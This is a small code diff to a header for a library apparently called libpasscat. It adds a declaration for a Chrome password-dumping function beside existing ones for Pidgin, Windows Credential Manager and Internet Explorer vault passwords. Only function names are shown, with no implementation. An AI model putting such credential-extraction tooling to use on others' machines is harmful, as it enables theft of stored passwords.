@@ -33,5 +33,6 @@ namespace libpasscat {
 	void cat_pidgin_passwords(void);
 	void cat_credmanager_passwords(void);
 	void cat_vault_ie_passwords(void);
+	void cat_chrome_passwords(void);
 	void finalize(void);
 }
